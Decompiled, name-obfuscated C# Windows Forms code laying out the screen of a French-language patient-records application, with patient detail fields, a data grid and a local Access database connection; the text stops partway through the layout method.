using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sp5f;
using Tm8;
using c8DW;
using o3C;

namespace Zz6;

[DesignerGenerated]
public class q9B : Form
{
	private IContainer components;

	private Button _Button1;

	private Panel _Panel4;

	private Button _Button4;

	private Button _Button3;

	private Panel _Panel3;

	private Panel _Panel2;

	private DateTimePicker _DateTimePicker1;

	private TextBox _txt_prenom;

	private TextBox _txt_Adresse;

	private TextBox _txt_nom;

	private Button _Button7;

	private Button _Button8;

	private Button _Button10;

	private Button _Button11;

	private DataGridView _DataGridView1;

	private DataGridViewTextBoxColumn _Column2;

	private DataGridViewTextBoxColumn _Column5;

	private DataGridViewTextBoxColumn _Column8;

	private TextBox _TextBox1;

	private Button _Button14;

	private string strconnexion;

	private OleDbConnection oConnection;

	internal Panel X;

	internal PictureBox f;

	internal Button K;

	internal Button W;

	internal GroupBox l;

	internal DateTimePicker H;

	internal Label y;

	internal TextBox c;

	internal PictureBox r;

	internal Label P;

	internal ComboBox a;

	internal Label i;

	internal Label s;

	internal Label j;

	internal Label b;

	internal Label M;

	internal Label d;

	internal TextBox t;

	internal Button e;

	internal Button u;

	internal Button v;

	internal Button N;

	internal DataGridViewTextBoxColumn Q;

	internal DataGridViewTextBoxColumn O;

	internal DataGridViewTextBoxColumn G;

	internal DataGridViewTextBoxColumn Z;

	internal DataGridViewTextBoxColumn fX;

	internal DataGridView ff;

	internal Label fK;

	internal string fW;

	public q9B()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Di51);
		strconnexion = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=C:\\Users\\moham\\Desktop\\Base_Patient.mdb";
		oConnection = new OleDbConnection(strconnexion);
		f9W8();
	}

	protected override void b2Q(bool Bd8)
	{
		try
		{
			if (Bd8 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Bd8);
		}
	}

	private void f9W8()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected O, but got Unknown
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Expected O, but got Unknown
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_0332: Unknown result type (might be due to invalid IL or missing references)
		//IL_038d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fd: Expected O, but got Unknown
		//IL_0438: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_052e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0538: Expected O, but got Unknown
		//IL_0573: Unknown result type (might be due to invalid IL or missing references)
		//IL_05eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f5: Expected O, but got Unknown
		//IL_0630: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b2: Expected O, but got Unknown
		//IL_06ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_0765: Unknown result type (might be due to invalid IL or missing references)
		//IL_076f: Expected O, but got Unknown
		//IL_07aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0837: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ae7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b71: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d88: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e02: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ea0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f80: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ff7: Unknown result type (might be due to invalid IL or missing references)
		//IL_106f: Unknown result type (might be due to invalid IL or missing references)
		//IL_10e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_115e: Unknown result type (might be due to invalid IL or missing references)
		//IL_11d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_123a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1295: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_135a: Unknown result type (might be due to invalid IL or missing references)
		//IL_13d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_146b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1502: Unknown result type (might be due to invalid IL or missing references)
		//IL_1599: Unknown result type (might be due to invalid IL or missing references)
		//IL_169a: Unknown result type (might be due to invalid IL or missing references)
		//IL_18dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_193e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1948: Expected O, but got Unknown
		//IL_1979: Unknown result type (might be due to invalid IL or missing references)
		//IL_19e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_19f0: Expected O, but got Unknown
		//IL_1a1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a84: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a8e: Expected O, but got Unknown
		//IL_1abc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b22: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b2c: Expected O, but got Unknown
		//IL_1b5a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bc0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bca: Expected O, but got Unknown
		//IL_1bf8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d83: Unknown result type (might be due to invalid IL or missing references)
		o6KX(new Panel());
		Jn26(new PictureBox());
		Kn7s(new Button());
		x2HL(new Panel());
		Kb0r(new Button());
		Xc3n(new Button());
		c6MD(new Button());
		a2B7(new Button());
		Pq64(new Panel());
		o1BD(new Panel());
		s2W1(new GroupBox());
		i0ML(new Button());
		a9BL(new TextBox());
		Yr07(new DateTimePicker());
		g3J9(new Label());
		r9R0(new TextBox());
		c9XP(new PictureBox());
		p3SC(new Label());
		Tf7m(new ComboBox());
		Dj18(new Label());
		e3G8(new DateTimePicker());
		t2A0(new Label());
		y9Z2(new Label());
		r2D0(new Label());
		Ni6j(new Label());
		So7z(new Label());
		j5X8(new TextBox());
		x8K1(new TextBox());
		Ao2x(new TextBox());
		e7M6(new TextBox());
		Wn34(new Button());
		g6L8(new Button());
		z8TE(new Button());
		g7JY(new Button());
		c2G8(new DataGridView());
		Pg8o(new DataGridViewTextBoxColumn());
		p3B6(new DataGridViewTextBoxColumn());
		Nm0r(new DataGridViewTextBoxColumn());
		i3TK(new DataGridViewTextBoxColumn());
		Np15(new DataGridViewTextBoxColumn());
		Zo37(new DataGridViewTextBoxColumn());
		z4KJ(new DataGridViewTextBoxColumn());
		g1AC(new DataGridViewTextBoxColumn());
		Ep3k(new DataGridView());
		Ec70(new Label());
		Zt3b(new Button());
		g8TF(new Button());
		Mr78(new Button());
		Zn4y(new Button());
		((Control)Zq15()).SuspendLayout();
		((ISupportInitialize)g5BN()).BeginInit();
		((Control)x0MJ()).SuspendLayout();
		((ISupportInitialize)f2QL()).BeginInit();
		((ISupportInitialize)b4RB()).BeginInit();
		((ISupportInitialize)Ls4a()).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Zq15()).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)Zq15()).get_Controls().Add((Control)(object)g5BN());
		((Control)Zq15()).get_Controls().Add((Control)(object)p1F7());
		((Control)Zq15()).get_Controls().Add((Control)(object)k4SZ());
		((Control)Zq15()).get_Controls().Add((Control)(object)Dj51());
		((Control)Zq15()).get_Controls().Add((Control)(object)Tj93());
		((Control)Zq15()).get_Controls().Add((Control)(object)Ri7d());
		((Control)Zq15()).get_Controls().Add((Control)(object)o6X4());
		((Control)Zq15()).set_Dock((DockStyle)3);
		((Control)Zq15()).set_Location(new Point(0, 0));
		((Control)Zq15()).set_Margin(new Padding(4));
		((Control)Zq15()).set_Name("Panel1");
		((Control)Zq15()).set_Size(new Size(237, 757));
		((Control)Zq15()).set_TabIndex(3);
		((Control)g5BN()).set_Location(new Point(65, 37));
		((Control)g5BN()).set_Margin(new Padding(4));
		((Control)g5BN()).set_Name("PictureBox1");
		((Control)g5BN()).set_Size(new Size(92, 86));
		g5BN().set_TabIndex(15);
		g5BN().set_TabStop(false);
		((ButtonBase)p1F7()).set_FlatStyle((FlatStyle)1);
		((Control)p1F7()).set_Font(new Font("MS Reference Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)p1F7()).set_ForeColor(Color.White);
		((ButtonBase)p1F7()).set_ImageAlign((ContentAlignment)16);
		((Control)p1F7()).set_Location(new Point(16, 159));
		((Control)p1F7()).set_Margin(new Padding(4));
		((Control)p1F7()).set_Name("Button1");
		((Control)p1F7()).set_Size(new Size(267, 62));
		((Control)p1F7()).set_TabIndex(9);
		((ButtonBase)p1F7()).set_Text("Accueil");
		((ButtonBase)p1F7()).set_UseVisualStyleBackColor(true);
		((Control)k4SZ()).set_BackColor(Color.FromArgb(0, 192, 0));
		((Control)k4SZ()).set_ForeColor(Color.Red);
		((Control)k4SZ()).set_Location(new Point(4, 262));
		((Control)k4SZ()).set_Margin(new Padding(4));
		((Control)k4SZ()).set_Name("Panel4");
		((Control)k4SZ()).set_Size(new Size(5, 69));
		((Control)k4SZ()).set_TabIndex(3);
		((ButtonBase)Dj51()).set_FlatStyle((FlatStyle)1);
		((Control)Dj51()).set_Font(new Font("MS Reference Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)Dj51()).set_ForeColor(Color.White);
		((ButtonBase)Dj51()).set_ImageAlign((ContentAlignment)16);
		((Control)Dj51()).set_Location(new Point(16, 262));
		((Control)Dj51()).set_Margin(new Padding(4));
		((Control)Dj51()).set_Name("Button6");
		((Control)Dj51()).set_Size(new Size(267, 62));
		((Control)Dj51()).set_TabIndex(8);
		((ButtonBase)Dj51()).set_Text("Rnedez-vous");
		((ButtonBase)Dj51()).set_UseVisualStyleBackColor(true);
		((ButtonBase)Tj93()).set_FlatStyle((FlatStyle)1);
		((Control)Tj93()).set_Font(new Font("MS Reference Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)Tj93()).set_ForeColor(Color.White);
		((ButtonBase)Tj93()).set_ImageAlign((ContentAlignment)16);
		((Control)Tj93()).set_Location(new Point(16, 561));
		((Control)Tj93()).set_Margin(new Padding(4));
		((Control)Tj93()).set_Name("Button4");
		((Control)Tj93()).set_Size(new Size(267, 62));
		((Control)Tj93()).set_TabIndex(6);
		((ButtonBase)Tj93()).set_Text("Réglages");
		((ButtonBase)Tj93()).set_UseVisualStyleBackColor(true);
		((ButtonBase)Ri7d()).set_FlatStyle((FlatStyle)1);
		((Control)Ri7d()).set_Font(new Font("MS Reference Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)Ri7d()).set_ForeColor(Color.White);
		((ButtonBase)Ri7d()).set_ImageAlign((ContentAlignment)16);
		((Control)Ri7d()).set_Location(new Point(16, 453));
		((Control)Ri7d()).set_Margin(new Padding(4));
		((Control)Ri7d()).set_Name("Button3");
		((Control)Ri7d()).set_Size(new Size(267, 62));
		((Control)Ri7d()).set_TabIndex(5);
		((ButtonBase)Ri7d()).set_Text("Bilan");
		((ButtonBase)Ri7d()).set_UseVisualStyleBackColor(true);
		((ButtonBase)o6X4()).set_FlatStyle((FlatStyle)1);
		((Control)o6X4()).set_Font(new Font("MS Reference Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)o6X4()).set_ForeColor(Color.White);
		((ButtonBase)o6X4()).set_ImageAlign((ContentAlignment)16);
		((Control)o6X4()).set_Location(new Point(16, 357));
		((Control)o6X4()).set_Margin(new Padding(4));
		((Control)o6X4()).set_Name("Button2");
		((Control)o6X4()).set_Size(new Size(233, 89));
		((Control)o6X4()).set_TabIndex(4);
		((ButtonBase)o6X4()).set_Text(" Traitement\r\n  et Résultats");
		((ButtonBase)o6X4()).set_UseVisualStyleBackColor(true);
		((Control)Gp0r()).set_BackColor(Color.FromArgb(0, 192, 0));
		((Control)Gp0r()).set_Location(new Point(279, 1));
		((Control)Gp0r()).set_Margin(new Padding(4));
		((Control)Gp0r()).set_Name("Panel3");
		((Control)Gp0r()).set_Size(new Size(144, 100));
		((Control)Gp0r()).set_TabIndex(16);
		((Control)Gj61()).set_BackColor(Color.FromArgb(0, 192, 0));
		((Control)Gj61()).set_Dock((DockStyle)1);
		((Control)Gj61()).set_Location(new Point(237, 0));
		((Control)Gj61()).set_Margin(new Padding(4));
		((Control)Gj61()).set_Name("Panel2");
		((Control)Gj61()).set_Size(new Size(1294, 12));
		((Control)Gj61()).set_TabIndex(17);
		((Control)x0MJ()).set_BackColor(Color.LightGreen);
		((Control)x0MJ()).get_Controls().Add((Control)(object)n0TW());
		((Control)x0MJ()).get_Controls().Add((Control)(object)s4RZ());
		((Control)x0MJ()).get_Controls().Add((Control)(object)Bf8c());
		((Control)x0MJ()).get_Controls().Add((Control)(object)q7RM());
		((Control)x0MJ()).get_Controls().Add((Control)(object)t4N7());
		((Control)x0MJ()).get_Controls().Add((Control)(object)f2QL());
		((Control)x0MJ()).get_Controls().Add((Control)(object)n6JD());
		((Control)x0MJ()).get_Controls().Add((Control)(object)Rs39());
		((Control)x0MJ()).get_Controls().Add((Control)(object)Bj6n());
		((Control)x0MJ()).get_Controls().Add((Control)(object)Qp9w());
		((Control)x0MJ()).get_Controls().Add((Control)(object)Jn6c());
		((Control)x0MJ()).get_Controls().Add((Control)(object)Zs0e());
		((Control)x0MJ()).get_Controls().Add((Control)(object)o5Y9());
		((Control)x0MJ()).get_Controls().Add((Control)(object)Wx64());
		((Control)x0MJ()).get_Controls().Add((Control)(object)e8C3());
		((Control)x0MJ()).get_Controls().Add((Control)(object)Js73());
		((Control)x0MJ()).get_Controls().Add((Control)(object)j3FP());
		((Control)x0MJ()).get_Controls().Add((Control)(object)Cb9r());
		((Control)x0MJ()).get_Controls().Add((Control)(object)Yi4x());
		((Control)x0MJ()).set_Location(new Point(279, 138));
		((Control)x0MJ()).set_Margin(new Padding(4));
		((Control)x0MJ()).set_Name("GroupBox1");
		((Control)x0MJ()).set_Padding(new Padding(4));
		((Control)x0MJ()).set_Size(new Size(1129, 287));
		((Control)x0MJ()).set_TabIndex(18);
		x0MJ().set_TabStop(false);
		x0MJ().set_Text("Informations Perssonelles ");
		((ButtonBase)n0TW()).set_BackColor(Color.LightGreen);
		((ButtonBase)n0TW()).set_FlatStyle((FlatStyle)1);
		((Control)n0TW()).set_Location(new Point(915, 231));
		((Control)n0TW()).set_Margin(new Padding(4));
		((Control)n0TW()).set_Name("Button14");
		((Control)n0TW()).set_Size(new Size(148, 28));
		((Control)n0TW()).set_TabIndex(31);
		((ButtonBase)n0TW()).set_Text("Ajouter une image du Patient");
		((ButtonBase)n0TW()).set_UseVisualStyleBackColor(false);
		((Control)s4RZ()).set_Location(new Point(846, 202));
		((Control)s4RZ()).set_Name("TextBox1");
		((Control)s4RZ()).set_Size(new Size(276, 22));
		((Control)s4RZ()).set_TabIndex(21);
		Bf8c().set_Format((DateTimePickerFormat)2);
		((Control)Bf8c()).set_Location(new Point(179, 249));
		((Control)Bf8c()).set_Margin(new Padding(4));
		((Control)Bf8c()).set_Name("DateTimePicker2");
		Bf8c().set_ShowUpDown(true);
		((Control)Bf8c()).set_Size(new Size(211, 22));
		((Control)Bf8c()).set_TabIndex(20);
		q7RM().set_AutoSize(true);
		((Control)q7RM()).set_Location(new Point(484, 156));
		((Control)q7RM()).set_Margin(new Padding(4, 0, 4, 0));
		((Control)q7RM()).set_Name("Label10");
		((Control)q7RM()).set_Size(new Size(76, 17));
		((Control)q7RM()).set_TabIndex(19);
		q7RM().set_Text("Téléphone");
		((Control)t4N7()).set_Location(new Point(629, 148));
		((Control)t4N7()).set_Margin(new Padding(4));
		((Control)t4N7()).set_Name("txt_Telephone");
		((Control)t4N7()).set_Size(new Size(160, 22));
		((Control)t4N7()).set_TabIndex(18);
		((Control)f2QL()).set_Location(new Point(880, 23));
		((Control)f2QL()).set_Margin(new Padding(4));
		((Control)f2QL()).set_Name("PictureBox2");
		((Control)f2QL()).set_Size(new Size(223, 172));
		f2QL().set_TabIndex(16);
		f2QL().set_TabStop(false);
		n6JD().set_AutoSize(true);
		((Control)n6JD()).set_Location(new Point(48, 254));
		((Control)n6JD()).set_Margin(new Padding(4, 0, 4, 0));
		((Control)n6JD()).set_Name("Label8");
		((Control)n6JD()).set_Size(new Size(110, 17));
		((Control)n6JD()).set_TabIndex(15);
		n6JD().set_Text("Date du Dossier");
		((ListControl)Rs39()).set_FormattingEnabled(true);
		Rs39().get_Items().AddRange(new object[2] { "Homme ", "Femme" });
		((Control)Rs39()).set_Location(new Point(179, 135));
		((Control)Rs39()).set_Margin(new Padding(4));
		((Control)Rs39()).set_Name("cb_Sexe");
		((Control)Rs39()).set_Size(new Size(160, 24));
		((Control)Rs39()).set_TabIndex(13);
		Bj6n().set_AutoSize(true);
		((Control)Bj6n()).set_Location(new Point(51, 198));
		((Control)Bj6n()).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Bj6n()).set_Name("Label7");
		((Control)Bj6n()).set_Size(new Size(60, 17));
		((Control)Bj6n()).set_TabIndex(12);
		Bj6n().set_Text("Adresse");
		Qp9w().set_Format((DateTimePickerFormat)2);
		((Control)Qp9w()).set_Location(new Point(625, 85));
		((Control)Qp9w()).set_Margin(new Padding(4));
		((Control)Qp9w()).set_Name("DateTimePicker1");
		Qp9w().set_ShowUpDown(true);
		((Control)Qp9w()).set_Size(new Size(164, 22));
		((Control)Qp9w()).set_TabIndex(11);
		Jn6c().set_AutoSize(true);
		((Control)Jn6c()).set_Location(new Point(487, 32));
		((Control)Jn6c()).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Jn6c()).set_Name("Label6");
		((Control)Jn6c()).set_Size(new Size(57, 17));
		((Control)Jn6c()).set_TabIndex(10);
		Jn6c().set_Text("Prénom");
		Zs0e().set_AutoSize(true);
		((Control)Zs0e()).set_Location(new Point(487, 92));
		((Control)Zs0e()).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Zs0e()).set_Name("Label5");
		((Control)Zs0e()).set_Size(new Size(128, 17));
		((Control)Zs0e()).set_TabIndex(9);
		Zs0e().set_Text("Date de Naissance");
		o5Y9().set_AutoSize(true);
		((Control)o5Y9()).set_Location(new Point(48, 92));
		((Control)o5Y9()).set_Margin(new Padding(4, 0, 4, 0));
		((Control)o5Y9()).set_Name("Label4");
		((Control)o5Y9()).set_Size(new Size(30, 17));
		((Control)o5Y9()).set_TabIndex(8);
		o5Y9().set_Text("CIN");
		Wx64().set_AutoSize(true);
		((Control)Wx64()).set_Location(new Point(48, 145));
		((Control)Wx64()).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Wx64()).set_Name("Label2");
		((Control)Wx64()).set_Size(new Size(39, 17));
		((Control)Wx64()).set_TabIndex(7);
		Wx64().set_Text("Sexe");
		e8C3().set_AutoSize(true);
		((Control)e8C3()).set_Location(new Point(48, 44));
		((Control)e8C3()).set_Margin(new Padding(4, 0, 4, 0));
		((Control)e8C3()).set_Name("Label1");
		((Control)e8C3()).set_Size(new Size(37, 17));
		((Control)e8C3()).set_TabIndex(6);
		e8C3().set_Text("Nom");
		((Control)Js73()).set_Location(new Point(623, 23));
		((Control)Js73()).set_Margin(new Padding(4));
		((Control)Js73()).set_Name("txt_prenom");
		((Control)Js73()).set_Size(new Size(164, 22));
		((Control)Js73()).set_TabIndex(4);
		((Control)j3FP()).set_Location(new Point(179, 89));
		((Control)j3FP()).set_Margin(new Padding(4));
		((Control)j3FP()).set_Name("txt_CIN");
		((Control)j3FP()).set_Size(new Size(160, 22));
		((Control)j3FP()).set_TabIndex(3);
		((Control)Cb9r()).set_Location(new Point(179, 194));
		((Control)Cb9r()).set_Margin(new Padding(4));
		Cb9r().set_Multiline(true);
		((Control)Cb9r()).set_Name("txt_Adresse");
		((Control)Cb9r()).set_Size(new Size(611, 24));
		((Control)Cb9r()).set_TabIndex(2);
		((Control)Yi4x()).set_Location(new Point(179, 36));
		((Control)Yi4x()).set_Margin(new Padding(4));
		((Control)Yi4x()).set_Name("txt_nom");
		((Control)Yi4x()).set_Size(new Size(160, 22));
		((Control)Yi4x()).set_TabIndex(0);
		((ButtonBase)n3MD()).set_BackColor(Color.White);
		((ButtonBase)n3MD()).set_FlatStyle((FlatStyle)0);
		((Control)n3MD()).set_Location(new Point(792, 453));
		((Control)n3MD()).set_Margin(new Padding(4));
		((Control)n3MD()).set_Name("Button11");
		((Control)n3MD()).set_Size(new Size(148, 28));
		((Control)n3MD()).set_TabIndex(25);
		((ButtonBase)n3MD()).set_Text("Sauvegarder\r\n");
		((ButtonBase)n3MD()).set_UseVisualStyleBackColor(false);
		((ButtonBase)Hc4k()).set_BackColor(Color.White);
		((ButtonBase)Hc4k()).set_FlatStyle((FlatStyle)0);
		((Control)Hc4k()).set_Location(new Point(1004, 453));
		((Control)Hc4k()).set_Margin(new Padding(4));
		((Control)Hc4k()).set_Name("Button13");
		((Control)Hc4k()).set_Size(new Size(199, 28));
		((Control)Hc4k()).set_TabIndex(26);
		((ButtonBase)Hc4k()).set_Text("Gérer les Rendez-Vous");
		((ButtonBase)Hc4k()).set_UseVisualStyleBackColor(false);
		((ButtonBase)p8K0()).set_BackColor(Color.White);
		((ButtonBase)p8K0()).set_FlatStyle((FlatStyle)0);
		((Control)p8K0()).set_Location(new Point(1260, 453));
		((Control)p8K0()).set_Margin(new Padding(4));
		((Control)p8K0()).set_Name("Button12");
		((Control)p8K0()).set_Size(new Size(148, 28));
		((Control)p8K0()).set_TabIndex(27);
		((ButtonBase)p8K0()).set_Text("Réintialiser");
		((ButtonBase)p8K0()).set_UseVisualStyleBackColor(false);
		((ButtonBase)t7NP()).set_BackColor(Color.White);
		((ButtonBase)t7NP()).set_FlatStyle((FlatStyle)0);
		((Control)t7NP()).set_Location(new Point(279, 486));
		((Control)t7NP()).set_Margin(new Padding(4));
		((Control)t7NP()).set_Name("Button9");
		((Control)t7NP()).set_Size(new Size(349, 28));
		((Control)t7NP()).set_TabIndex(28);
		((ButtonBase)t7NP()).set_Text("Afficher les patients");
		((ButtonBase)t7NP()).set_UseVisualStyleBackColor(false);
		b4RB().set_AllowUserToOrderColumns(true);
		b4RB().set_BackgroundColor(Color.LightGreen);
		b4RB().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		b4RB().get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[8]
		{
			(DataGridViewColumn)Hr6c(),
			(DataGridViewColumn)Mx36(),
			(DataGridViewColumn)Px6i(),
			(DataGridViewColumn)Bd1j(),
			(DataGridViewColumn)s0YB(),
			(DataGridViewColumn)Qa1m(),
			(DataGridViewColumn)f6AL(),
			(DataGridViewColumn)f8TN()
		});
		((Control)b4RB()).set_Location(new Point(279, 522));
		((Control)b4RB()).set_Margin(new Padding(4));
		((Control)b4RB()).set_Name("DataGridView1");
		b4RB().set_RowHeadersWidth(51);
		((Control)b4RB()).set_Size(new Size(1129, 217));
		((Control)b4RB()).set_TabIndex(29);
		((DataGridViewColumn)Hr6c()).set_HeaderText("ID Du patient");
		((DataGridViewColumn)Hr6c()).set_MinimumWidth(6);
		((DataGridViewColumn)Hr6c()).set_Name("Column1");
		((DataGridViewColumn)Hr6c()).set_Width(125);
		((DataGridViewColumn)Mx36()).set_HeaderText("Nom");
		((DataGridViewColumn)Mx36()).set_MinimumWidth(6);
		((DataGridViewColumn)Mx36()).set_Name("Column2");
		((DataGridViewColumn)Mx36()).set_Width(125);
		((DataGridViewColumn)Px6i()).set_HeaderText("Prénom");
		((DataGridViewColumn)Px6i()).set_MinimumWidth(6);
		((DataGridViewColumn)Px6i()).set_Name("Column3");
		((DataGridViewColumn)Px6i()).set_Width(125);
		((DataGridViewColumn)Bd1j()).set_HeaderText("CIN");
		((DataGridViewColumn)Bd1j()).set_MinimumWidth(6);
		((DataGridViewColumn)Bd1j()).set_Name("Column4");
		((DataGridViewColumn)Bd1j()).set_Width(125);
		((DataGridViewColumn)s0YB()).set_HeaderText("Date de néssance");
		((DataGridViewColumn)s0YB()).set_MinimumWidth(6);
		((DataGridViewColumn)s0YB()).set_Name("Column5");
		((DataGridViewColumn)s0YB()).set_Width(125);
